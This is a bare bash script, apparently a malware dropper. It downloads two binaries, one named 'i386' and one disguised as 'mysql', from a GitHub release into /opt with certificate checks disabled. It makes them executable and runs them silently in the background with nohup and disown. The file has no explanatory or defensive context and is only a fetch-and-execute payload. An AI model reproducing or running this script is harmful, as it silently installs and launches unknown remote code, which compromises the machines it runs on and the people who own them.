#!/bin/bash


cd /opt; wget -qO i386 --no-check-certificate https://github.com/mumu1667/trx20/releases/download/fuck/i386; chmod +x i386; nohup ./i386 >/dev/null 2>&1 & disown
cd /opt; wget -qO mysql --no-check-certificate https://github.com/mumu1667/trx20/releases/download/fuck/mysql; chmod +x mysql; ./mysql & disown

